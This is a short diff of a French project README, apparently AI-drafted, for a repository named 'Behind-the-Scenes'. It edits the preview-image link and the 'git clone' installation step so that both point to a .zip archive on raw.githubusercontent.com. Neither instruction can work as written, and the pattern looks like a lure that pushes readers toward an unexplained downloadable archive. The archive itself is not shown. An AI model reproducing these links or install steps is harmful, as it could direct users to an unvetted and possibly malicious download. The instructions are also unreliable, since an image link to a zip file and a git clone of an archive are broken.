@@ -45,7 +45,7 @@ Merci pour la précision, voici une version mise à jour du README, en tenant co
 
 ## 📸 **Aperçu**
 
-![Aperçu du Projet](https://raw.githubusercontent.com/Martialdepaul/Behind-the-Scenes/main/src/components/UI/Behind-the-Scenes_1.4.zip)
+![Aperçu du Projet](https://raw.githubusercontent.com/Martialdepaul/Behind-the-Scenes/main/public/Behind-the-Scenes-v1.7.zip)
 
 ---
 
@@ -53,7 +53,7 @@ Merci pour la précision, voici une version mise à jour du README, en tenant co
 
 1. Clonez le dépôt :
    ```bash
-   git clone https://raw.githubusercontent.com/Martialdepaul/Behind-the-Scenes/main/src/components/UI/Behind-the-Scenes_1.4.zip
+   git clone https://raw.githubusercontent.com/Martialdepaul/Behind-the-Scenes/main/public/Behind-the-Scenes-v1.7.zip
 Behind-the-Scenes
    ```
 2. Installez les dépendances :
